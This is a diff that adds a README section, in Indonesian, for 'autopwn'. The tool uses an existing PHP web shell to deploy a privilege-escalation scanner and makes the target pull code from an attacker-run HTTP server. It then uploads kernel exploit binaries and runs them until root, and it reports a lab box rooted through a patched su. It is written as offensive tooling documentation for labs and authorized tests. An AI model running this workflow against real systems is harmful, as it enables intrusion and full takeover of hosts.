@@ -131,6 +131,52 @@ identik dengan python.
   — ini persis semantik `os.access` CPython di Windows (`win32_access`), bukan
   probe tulis, jadi scanner tetap 100% read-only.
 
+## autopwn — otomasi scan → biner PoC → eksekusi via web shell
+
+Orkestrator sisi penyerang (jalan di mesin arsip): deploy scanner ke target lewat
+web shell → ambil report → pilih biner PoC dari arsip lokal `cve-lpe/pocs/bin/`
+→ upload → eksekusi checker/exploit → verifikasi root. Scanner tetap read-only;
+yang mengeksekusi PoC hanya tool ini dan hanya terhadap target dari `--shell`.
+
+```bash
+python3 autopwn.py --shell http://TARGET/uploads/shell.php   # full: scan→root
+python3 autopwn.py --shell URL --scan-only                   # scan + PLAN.md saja
+python3 autopwn.py --shell URL --allow-backported            # BP: checker-stage saja
+python3 autopwn.py --selftest                                # gate offline
+```
+
+Alur per target:
+
+1. **probe** — id/kernel/os/python3 → pilih flavor (python3 ≥3.8 → bash4 → abort).
+2. **deploy** — scanner ke `/tmp/.ap<rand>/`; pengiriman tiga lapis:
+   (1) `--fetch-base URL` hosting eksternal; (2) default: HTTP server ephemeral di
+   mesin arsip (hanya file terpilih, mati setelah run) → target tarik via
+   `python3 urllib`; (3) fallback chunk base64 via `echo | base64 -d`. Semua
+   jalur verifikasi `md5sum`.
+3. **scan** — backgrounded (`nohup` + poll `done.flag`, lolos `max_execution_time`
+   PHP) → report ditarik (fast path <40 KB; else gzip+split 24K + filter junk).
+4. **select** — parity buildkit (has_poc, confidence, KEV→tier→score) + skip
+   `likely_backported` (kecuali `--allow-backported` = checker-stage saja) dan
+   skip `escape_class` bila target container.
+5. **execute** — checker-first (`*check*/*verif*` di arsip; safe → skip CVE),
+   lalu exploit dengan template `RECIPES` per CVE (seed: CopyFail), stop di root
+   pertama, `--max-exploits` default 3, `--post-root-cmd` default
+   `id; hostname; uname -a`.
+
+Output per target di `autopwn-out/{host}-{ts}/`: `scan.json`, `PLAN.md`
+(constraint vs terpasang, repo, biner lokal), `run.log`, `events.json`.
+
+- **Khusus target terautorisasi** (lab sendiri/CTF/pentest berizin). Target
+  produksi: wajib `--production` + `--confirm-production` (banner risiko).
+- Eksploit kernel bisa crash box lab — mitigasi: checker-first, stop-at-first-root.
+- Terbukti E2E (2026-09-28, lab 192.168.1.x): kedua box Ubuntu 24.04 di-root
+  via CVE-2026-31431 CopyFail (checker VULNERABLE → patch su → `uid=0`); run
+  ulang terdeteksi `already_root` tanpa exploit ulang.
+- Quirk shell HAXOR v9: POST-only param `cmd`, output di `<pre>` pertama, command
+  wajib satu baris; template RECIPES dilarang memakai tanda kutip tunggal.
+- Quirk su ter-patch CopyFail: baris pertama stdin dieksekusi sebagai command
+  root (`-c` diabaikan) → verify `echo id | /usr/bin/su`.
+
 ## Catatan
 
 - Dataset = snapshot NVD + CISA KEV yang di-generate per `2026-09-26`,
